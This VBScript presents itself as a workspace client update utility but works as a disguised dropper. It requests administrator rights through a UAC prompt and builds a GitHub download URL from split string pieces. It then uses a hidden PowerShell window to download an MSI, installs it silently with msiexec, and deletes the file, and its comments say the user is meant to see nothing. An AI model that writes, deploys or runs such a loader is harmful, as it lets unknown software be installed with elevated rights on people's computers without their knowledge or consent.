' ==========================================
' Workspace Client Update Utility
' ==========================================
Set objShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' 1. Admin/UAC Elevation
On Error Resume Next
isAdmin = False
testFile = "C:\Windows\system32\__sys_check.tmp"
objFSO.CreateTextFile testFile, True 
If objFSO.FileExists(testFile) Then
    objFSO.DeleteFile testFile
    isAdmin = True
End If
On Error GoTo 0

If Not isAdmin Then
    ' Standard UAC Prompt
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End If

' 2. Variables & Paths
' We use Public Documents because it is often less restricted than Temp
targetFolder = WshShell.ExpandEnvironmentStrings("%PUBLIC%") 
tempMsi = targetFolder & "\WorkspaceUpdate.msi"

p1 = "htt" & "ps://github.com/sample1909-hash/my-installers/"
p2 = "raw/refs/heads/main/Install.msi"
fullUrl = p1 & p2

' 3. Robust Download & Install
' We use PowerShell for the download part because it handles modern SSL/TLS better than curl
' but we run it HIDDEN so the user sees nothing.
dnlCmd = "powershell -WindowStyle Hidden -Command " & _
         "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
         "(New-Object Net.WebClient).DownloadFile('" & fullUrl & "', '" & tempMsi & "')"

insCmd = "msiexec /i " & Chr(34) & tempMsi & Chr(34) & " /qn /norestart"
delCmd = "del /f /q " & Chr(34) & tempMsi & Chr(34)

' Run the sequence: Download -> Wait 2 Seconds -> Install -> Delete
' 0 = Hidden Window, True = Wait for process to exit
WshShell.Run "cmd /c " & dnlCmd, 0, True

' Small pause to ensure file handle is released
WScript.Sleep 2000 

If objFSO.FileExists(tempMsi) Then
    WshShell.Run insCmd, 0, True
    WshShell.Run "cmd /c " & delCmd, 0, False
End If
